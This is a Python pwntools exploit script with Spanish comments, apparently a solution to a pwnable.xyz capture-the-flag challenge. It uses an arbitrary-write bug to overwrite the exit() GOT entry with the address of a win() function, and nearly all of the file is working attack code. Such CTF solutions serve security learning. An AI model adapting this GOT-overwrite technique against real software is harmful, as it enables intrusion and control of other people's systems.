#!/usr/bin/env python3
"""
Segunda solución: Arbitrary write vulnerability

La opción 3 tiene un bug:
- mov -0x10(%rbp),%rax  ; Lee el VALOR en rbp-0x10
- mov %rax,%rsi         ; Lo usa como PUNTERO para scanf
- scanf("%d", rsi)      ; Escribe en esa dirección

Estrategia:
1. Usar opción 2 (nationality) para escribir una dirección en rbp-0x10
   - rbp-0x10 está a 0x10 bytes del inicio de nationality en rbp-0x20
2. Usar opción 3 para escribir el valor que queremos en esa dirección

Objetivos posibles:
- Sobrescribir GOT entry (exit, printf, etc.) con dirección de win()
- Usar la dirección de alguna función que se llame después
"""

from pwn import *

context.log_level = 'info'

def exploit(target='local'):
    if target == 'local':
        p = process('./image/challenge/challenge')
    else:
        p = remote('svc.pwnable.xyz', 30031)
    
    elf = ELF('./image/challenge/challenge')
    
    win_addr = elf.symbols['win']
    # Usar exit GOT - se llama cuando la opción es inválida
    exit_got = elf.got['exit']
    
    print(f"[*] win() address: {hex(win_addr)}")
    print(f"[*] exit GOT: {hex(exit_got)}")
    
    # Esperar el menú
    p.recvuntil(b'> ')
    
    # Opción 2: Change nationality
    # Queremos escribir exit_got en rbp-0x10
    # nationality empieza en rbp-0x20, necesitamos llegar a rbp-0x10
    # Eso es 0x10 bytes = 16 bytes desde el inicio
    p.sendline(b'2')
    p.recvuntil(b': ')
    
    # Enviar 16 bytes de padding + la dirección de exit GOT
    payload = b'A' * 16 + p64(exit_got)
    p.sendline(payload)
    
    # Esperar menú
    p.recvuntil(b'> ')
    
    # Opción 3: Change age
    # Esto escribirá en la dirección que pusimos (exit GOT)
    p.sendline(b'3')
    p.recvuntil(b': ')
    
    # scanf("%d") espera un entero decimal
    # Convertir win_addr a decimal
    p.sendline(str(win_addr).encode())
    
    # Esperar menú
    p.recvuntil(b'> ')
    
    # Ahora cualquier opción inválida llamará exit(), que apunta a win()
    p.sendline(b'5')  # Opción inválida para trigger exit()
    
    # Recibir la flag
    try:
        response = p.recvall(timeout=2)
        print(response.decode())
    except:
        pass
    
    p.close()

if __name__ == '__main__':
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else 'local'
    exploit(target)